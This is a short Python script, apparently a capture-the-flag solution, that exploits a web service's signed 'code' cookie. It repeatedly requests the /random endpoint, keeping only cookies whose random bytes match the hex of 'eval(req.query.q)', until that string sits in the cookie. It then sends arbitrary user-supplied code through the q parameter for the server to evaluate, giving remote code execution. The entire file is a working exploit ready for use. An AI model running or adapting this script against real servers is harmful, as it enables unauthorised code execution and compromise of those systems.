import sys
import requests
from requests.cookies import RequestsCookieJar
import re
from urllib.parse import quote
from binascii import hexlify


def main():
    if len(sys.argv) == 3 and re.match("http://.*/", sys.argv[1]):
        global url
        url = sys.argv[1]
        code = sys.argv[2]
        print(get_result_from_code(code))
    else:
        print("Usage: executor.py \"http://url.to.instance/\" \"code to execute\"")


def get_result_from_code(code: str) -> str:
    print(f"Code to eval: {code}")
    code = f"eval({code})"
    cookies = generate_cookies()
    return requests.get(url + "random?q=" + quote(code), cookies=cookies).json().get("result")


def generate_cookies() -> RequestsCookieJar:
    # The code we want to execute is provided in a GET parameter. We want to have that evaluated.
    # This actually needs two eval()s, as first the variable needs to be read, then the content needs to be evaluated.
    code = "eval(req.query.q)"
    code = code + ";"*(20 - len(code)) # Pad the eval code with ; as it is only executed when it's length equals 20
    cookies = get_start_cookies() # Get an empty, signed cookie
    # The service adds random hex bytes, therefore we the need the hex representation ourselves
    code_hex = get_hex_representation(code)
    print(f"Generate cookie for: {code} (hex: {code_hex})")
    print(f"|{' '*16}Progress{' '*16}|\n ", end="")
    # Loop until we have the code we want to have executed in our cookie
    while get_code_hex_from_cookies(cookies) != code_hex:
        # Get the next cookie with an additional random byte
        next_rand_cookies = get_next_rnd_cookies(cookies)
        # Keep it if it is the next byte we need, otherwise discard
        if code_hex.startswith(get_code_hex_from_cookies(next_rand_cookies)):
            cookies = next_rand_cookies
            print("#", end="")
    print()
    return cookies


def get_start_cookies() -> RequestsCookieJar:
    response = requests.get(url)
    return response.cookies


def get_next_rnd_cookies(prev_cookies: RequestsCookieJar) -> RequestsCookieJar:
    response = requests.get(url + "random", cookies=prev_cookies)
    return response.cookies


def get_hex_representation(orig: str) -> str:
    orig_bytes = orig.encode("utf-8")
    return hexlify(orig_bytes).decode("utf-8")


def get_code_hex_from_cookies(cookies: RequestsCookieJar) -> str:
    code_cookie = cookies.get("code")
    # The format of a signed cookie is:
    # s%3A<COOKIE_VALUE>.<SIGNATURE>
    return code_cookie.split("s%3A")[1].split(".")[0]


if __name__ == "__main__":
    main()
